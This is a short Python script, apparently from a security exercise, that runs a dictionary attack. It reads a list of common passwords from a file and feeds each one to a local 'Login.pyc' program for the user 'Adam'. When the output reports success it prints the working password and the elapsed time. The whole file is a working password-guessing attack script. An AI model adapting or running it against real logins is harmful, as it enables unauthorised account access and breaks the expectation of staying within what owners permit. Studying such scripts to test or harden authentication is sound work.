import time
import subprocess


def _break():
    f = open("MostCommonPWs", "r")
    Passwords = [line.rstrip('\n') for line in f]
    for pwd in Passwords:
        output = subprocess.run(["python3", "Login.pyc", "Adam", pwd], capture_output = True, text = True).stdout.strip("\n")
        if "success" in output:
            print("The Working Password Is: ", pwd)
            end = time.ctime(time.time())
            print("End Time: ", end)
            break

start = time.ctime(time.time())
print("Start Time: ", start)
_break()
